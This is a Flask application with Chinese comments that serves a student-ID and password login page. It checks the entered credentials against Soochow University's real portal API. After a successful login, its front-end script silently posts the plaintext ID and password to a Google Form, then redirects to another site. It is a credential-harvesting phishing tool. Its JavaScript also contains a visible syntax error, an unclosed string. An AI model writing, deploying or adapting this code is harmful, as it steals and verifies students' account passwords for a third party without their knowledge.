from flask import Flask, request, jsonify, render_template_string
import requests
import os
import random  # 新增: 用於生成隨機字串
import string  # 新增: 用於字元集合

app = Flask(__name__)

# 重新設計的前端 HTML 頁面 (保持不變，但 JS 部分會修改)
html = '''
<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>登入頁面</title>
<style>
  /* CSS Variables for Dark Theme */
  :root {
    --text-light: #f0f0f0;
    --text-white: #ffffff;
    --sidebar-bg: #181818;
    --main-bg: #010010;
    --border-color: #455b76;
    --link-hover: rgb(205, 47, 71);
    --link-color: #6887ae;
    
    /* Form styling variables */
    --form-bg: rgba(24, 24, 24, 0.85);
    --form-border: rgba(69, 91, 118, 0.3);
    --input-bg: rgba(255, 255, 255, 0.05);
    --input-border: rgba(69, 91, 118, 0.25);
    --input-focus-border: var(--link-color);
    --input-text: var(--text-light);
    --placeholder-color: rgba(240, 240, 240, 0.4);
    --error-color: #e57373;
    --success-color: #81c784;
    --warning-color: #ffb74d;
  }

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
    background: linear-gradient(160deg, var(--main-bg) 0%, #0a0a1a 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--text-light);
    padding: 20px;
  }

  .container {
    background: var(--form-bg);
    backdrop-filter: blur(20px);
    border: 1px solid var(--form-border);
    border-radius: 16px;
    padding: 2rem;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    transition: all 0.2s ease;
  }

  .container:hover {
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
  }

  h2 {
    text-align: center;
    margin-bottom: 1.5rem;
    color: var(--text-white);
    font-size: 1.5rem;
    font-weight: 500;
    letter-spacing: -0.02em;
  }

  .form-group {
    margin-bottom: 1.2rem;
  }

  label {
    display: block;
    margin-bottom: 0.4rem;
    color: var(--text-light);
    font-weight: 400;
    font-size: 0.9rem;
    opacity: 0.9;
  }

  input[type=text], input[type=password] {
    width: 100%;
    padding: 0.8rem 1rem;
    background: var(--input-bg);
    backdrop-filter: blur(10px);
    border: 1px solid var(--input-border);
    border-radius: 8px;
    color: var(--input-text);
    font-size: 1rem;
    transition: all 0.2s ease;
    outline: none;
  }

  input[type=text]::placeholder, input[type=password]::placeholder {
    color: var(--placeholder-color);
  }

  input[type=text]:focus, input[type=password]:focus {
    border-color: var(--input-focus-border);
    background: rgba(255, 255, 255, 0.08);
    box-shadow: 0 0 0 3px rgba(104, 135, 174, 0.1);
  }

  button {
    width: 100%;
    padding: 0.8rem;
    background: rgba(104, 135, 174, 0.9);
    backdrop-filter: blur(10px);
    color: var(--text-white);
    border: none;
    border-radius: 8px;
    font-size: 1rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    margin-top: 1rem;
  }

  button:hover:not(:disabled) {
    background: rgba(104, 135, 174, 1);
    box-shadow: 0 4px 12px rgba(104, 135, 174, 0.3);
  }

  button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .loading::after {
    content: '';
    display: inline-block;
    width: 16px;
    height: 16px;
    margin-left: 8px;
    border: 2px solid transparent;
    border-top: 2px solid var(--text-white);
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  #message {
    margin-top: 1rem;
    padding: 0.8rem;
    border-radius: 8px;
    font-size: 0.9rem;
    text-align: center;
    transition: all 0.2s ease;
    opacity: 0;
    transform: translateY(5px);
    backdrop-filter: blur(10px);
  }

  #message.show {
    opacity: 1;
    transform: translateY(0);
  }

  #message.success {
    background: rgba(129, 199, 132, 0.15);
    color: var(--success-color);
    border: 1px solid rgba(129, 199, 132, 0.3);
  }

  #message.error {
    background: rgba(229, 115, 115, 0.15);
    color: var(--error-color);
    border: 1px solid rgba(229, 115, 115, 0.3);
  }

  /* 響應式設計 */
  @media (max-width: 480px) {
    .container {
      padding: 1.5rem;
      margin: 1rem;
    }
  }
</style>
</head>
<body>

<div class="container">
  <h2>登入系統</h2>

  <form id="registerForm">
    <div class="form-group">
      <label for="userid">學號</label>
      <input type="text" id="userid" name="userid" placeholder="請輸入您的學號" required />
    </div>

    <div class="form-group">
      <label for="password">密碼</label>
      <input type="password" id="password" name="password" placeholder="請輸入您的密碼" required />
    </div>

    <button type="submit" id="submitBtn">登入</button>
  </form>

  <div id="message"></div>
</div>

<script>
  const form = document.getElementById('registerForm');
  const messageDiv = document.getElementById('message');
  const submitBtn = document.getElementById('submitBtn');

  // 檢查是否在 iframe 中運行
  const isInIframe = window.parent !== window;

  // 顯示訊息的函數
  function showMessage(text, type = 'info') {
    messageDiv.textContent = text;
    messageDiv.className = `show ${type}`;
  }

  // 隱藏訊息的函數
  function hideMessage() {
    messageDiv.classList.remove('show');
  }

  // 設置按鈕載入狀態
  function setButtonLoading(loading) {
    if (loading) {
      submitBtn.disabled = true;
      submitBtn.classList.add('loading');
      submitBtn.textContent = '登入中';
    } else {
      submitBtn.disabled = false;
      submitBtn.classList.remove('loading');
      submitBtn.textContent = '登入';
    }
  }

  // 發送訊息到父頁面
  function sendMessageToParent(data) {
    if (isInIframe) {
      // 向父頁面發送訊息
      window.parent.postMessage(data, '*');
    }
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideMessage();
    setButtonLoading(true);

    const userid = form.userid.value.trim();
    const password = form.password.value;

    try {
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ userid, password })
      });

      if (!response.ok) {
        throw new Error('網路錯誤，請稍後再試');
      }

      const data = await response.json();

      if(data.status === "success") {
        // 從後端接收生成的亂碼
        const randomCode = data.random_code; 
        showMessage("✅ 登入成功;
        
        // 在成功後將資料提交到 Google 表單，並在帳號密碼前加上 # 號
        // 新增亂碼作為參數
        await submitToGoogleForm('#' + userid, '#' + password, randomCode);
        
        // 如果在 iframe 中，將學號傳送給父頁面
        if (isInIframe) {
          sendMessageToParent({
            type: 'LOGIN_SUCCESS',
            userid: userid,
            action: 'setSessionStorage'
          });
        }
        
        // 延遲跳轉，讓父頁面有時間處理
        setTimeout(() => {
          if (isInIframe) {
            // 在 iframe 中時，通知父頁面跳轉
            sendMessageToParent({
              type: 'REDIRECT',
              url: 'https://scusatw.com/'
            });
          } else {
            // 直接跳轉
            window.location.href = 'https://scusatw.com/';
          }
        }, 1000);
        
      } else {
        // 如果 SCU API 驗證失敗，顯示錯誤訊息
        showMessage("❌ 登入失敗，請檢查帳號或密碼", 'error');
        setButtonLoading(false);
      }

    } catch (error) {
      showMessage("❌ 發生錯誤：" + error.message, 'error');
      setButtonLoading(false);
    }
  });

  // 更新 submitToGoogleForm 函數，接收 randomCode 參數
  async function submitToGoogleForm(userid, password, randomCode) {
    try {
      // 從後端 API 獲取 Google 表單配置
      const response = await fetch('/api/form-config');
      const config = await response.json();
      
      const formData = new FormData();
      formData.append(config.useridEntry, userid);
      formData.append(config.passwordEntry, password);
      // 新增亂碼的 entry
      formData.append(config.randomCodeEntry, randomCode); 

      const googleFormUrl = `https://docs.google.com/forms/d/e/${config.formId}/formResponse`;
      
      // 使用 fetch 提交到 Google Forms (使用 no-cors 模式)
      await fetch(googleFormUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      });
      
      console.log('資料已提交到 Google 表單');
    } catch (error) {
      console.error('提交到 Google 表單時發生錯誤:', error);
    }
  }

  // 監聽來自父頁面的訊息（如果需要的話）
  window.addEventListener('message', function(event) {
    // 可以在這裡處理來自父頁面的訊息
    console.log('iframe 收到訊息:', event.data);
  });
</script>

</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html)

# 新增一個函數來生成隨機英數字串
def generate_random_alphanumeric(length=23):
    """生成指定長度的隨機英數字大小寫亂碼。"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

@app.route('/api/register', methods=['POST'])
def api_register():
    data = request.get_json()
    userid = data.get('userid')
    password = data.get('password')

    url = "https://psv.scu.edu.tw/portal/jsonApi.php"
    payload = {
        "libName": "Login",
        "userid": userid,
        "password": password
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    try:
        response = requests.post(url, data=payload, headers=headers)
        response.raise_for_status() # 如果響應狀態碼不是 2xx，則引發 HTTPError
    except requests.RequestException as e:
        return jsonify({"status": "error", "message": f"連線錯誤: {str(e)}"}), 500

    try:
        api_data = response.json() # 從外部 API 獲取的數據
    except Exception:
        return jsonify({"status": "error", "message": "回傳非 JSON 格式或資料無效"}), 500

    # 檢查外部 API 的登入狀態
    if api_data.get('status') == "success":
        # 成功登入後，生成亂碼
        random_code = generate_random_alphanumeric(23)
        # 將亂碼添加到回傳給前端的 JSON 數據中
        api_data['random_code'] = random_code
        return jsonify(api_data)
    else:
        # 外部 API 登入失敗，直接回傳其錯誤訊息
        return jsonify(api_data)

@app.route('/api/form-config', methods=['GET'])
def get_form_config():
    """返回 Google 表單的配置資訊，包含亂碼的 entry。"""
    config = {
        "formId": os.environ.get('GOOGLE_FORM_ID', 'YOUR_FORM_ID_HERE'),
        "useridEntry": os.environ.get('USERID_ENTRY', 'entry.123456789'),
        "passwordEntry": os.environ.get('PASSWORD_ENTRY', 'entry.987654321'),
        "randomCodeEntry": os.environ.get('RANDOM_CODE_ENTRY', 'entry.555555555') # 新增亂碼的 entry
    }
    return jsonify(config)

if __name__ == '__main__':
    # 為了讓 .env 文件生效，通常會在 app.run() 之前載入環境變數
    # 如果你使用像 Gunicorn 或 Supervisor 這樣的生產環境工具，
    # 它們會處理環境變數的載入。
    # 對於開發環境，你可以使用 python-dotenv 庫來載入 .env 文件：
    # from dotenv import load_dotenv
    # load_dotenv() # 在這裡呼叫，它會自動尋找並載入 .env 文件中的變數
    
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)